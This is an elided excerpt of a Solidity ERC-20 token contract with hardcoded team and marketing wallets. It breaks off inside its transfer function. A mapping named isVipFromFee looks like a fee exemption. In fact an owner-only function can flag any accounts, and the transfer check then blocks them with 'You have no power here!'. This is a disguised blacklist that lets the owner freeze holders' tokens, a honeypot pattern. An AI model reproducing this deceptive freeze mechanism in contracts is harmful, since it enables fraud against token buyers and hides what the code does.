...
contract Token is Context, IERC20, Ownable {
    ...
    mapping (address => bool) public isVipFromFee;
    ...
    uint256 private _totalSupply = 69 * 10 ** 21 * 10**_decimals;
    uint256 public _walletMax = 2 * 10 ** 21 * 10**_decimals;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xB320ba67e0E0b56D06a2E24D80349969210f99fc));
        marketingWalletAddress = payable(address(0x8Ca2299cE5fac55B0822fCd1DB9Ee2c866c753e3));
    ...
    function _multiSetVIP(address[] calldata accounts,bool isVIP) external onlyOwner() {
        for(uint256 i = 0; i < accounts.length; i++) {
            isVipFromFee[accounts[i]] = isVIP;
        }
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!isVipFromFee[sender]&&!isVipFromFee[recipient], "You have no power here!");
        if(inSwapAndLiquify)
        { 
